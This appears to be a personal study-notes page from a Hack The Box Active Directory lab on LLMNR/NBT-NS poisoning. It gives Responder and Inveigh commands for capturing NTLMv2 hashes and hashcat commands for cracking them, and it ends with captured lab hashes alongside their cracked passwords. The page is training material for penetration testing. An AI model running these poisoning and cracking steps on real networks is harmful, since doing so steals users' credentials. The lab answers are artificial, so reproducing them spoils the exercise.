---
description: >-
  Mitre ATT&CK lists this technique as ID: T1557.001, Adversary-in-the-Middle:
  LLMNR/NBT-NS Poisoning and SMB Relay.
---

# LLMNR/NBT-NS Poisoning - from Linux

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.&#x20;

LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain.

SMB Relay attacks

NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

| Tool                                                  | Description                                                                                         |
| ----------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| [Responder](https://github.com/lgandx/Responder)      | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.      |
| [Metasploit](https://www.metasploit.com/)             | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.  |

Both tools can be used to attack the following protocols:

* LLMNR
* DNS
* MDNS
* NBNS
* DHCP
* ICMP
* HTTP
* HTTPS
* SMB
* LDAP
* WebDAV
* Proxy Auth

Responder also has support for:

* MSSQL
* DCE-RPC
* FTP, POP3, IMAP, and SMTP auth

```
RFS85@htb[/htb]$ responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```

```
sudo responder -I ens224
```

### Hashcat crack NTLM Hash

```
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:

UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353

the `-A` flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interface or an IP.&#x20;

Responder config file

```
cd /usr/share/responder
```

### Tasks

```
sudo responder -A -I ens224
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 5600 hash_wley.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Inveigh - Overview



{% hint style="info" %}
Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.
{% endhint %}

## **Inveigh Parameters**

[https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)

```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

```
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C# Inveigh (InveighZero)

{% hint style="info" %}
The PowerShell version of Inveigh is the original version and is no longer updated.
{% endhint %}

```
PS C:\htb> .\Inveigh.exe
```

```
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

```
hashcat -m 5600 hash_svc_qualys.txt /usr/share/wordlists/rockyou.txt
```

{% code overflow="wrap" %}
```
SVC_QUALYS::INLANEFREIGHT:337506df4cf65211:9f096d270134e6c21a7df0b5345157fd:0101000000000000372ff0770fc4d901a77a6b0f9f3785fb0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800372ff0770fc4d90106000400020000000800300030000000000000000000000000300000b09a4c2c4531e5eafceb1a3890c79e136afe3cc939f8a3424e962e10f78dedee0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
BACKUPAGENT::INLANEFREIGHT:78287be3872185a8:939aee6d7b4defcc7053232a73a97e1f:0101000000000000d407c32c0fc4d90119409b1e6926eeda0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800d407c32c0fc4d90106000400020000000800300030000000000000000000000000300000b09a4c2c4531e5eafceb1a3890c79e136afe3cc939f8a3424e962e10f78dedee0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:h1backup55
FOREND::INLANEFREIGHT:7d1d7db1e80c8034:398c1bc4e338dddc5339e7904be5c042:010100000000000099078b380fc4d9013624169075fd699e0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080099078b380fc4d90106000400020000000800300030000000000000000000000000300000b09a4c2c4531e5eafceb1a3890c79e136afe3cc939f8a3424e962e10f78dedee0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:Klmcargo2
```
{% endcode %}
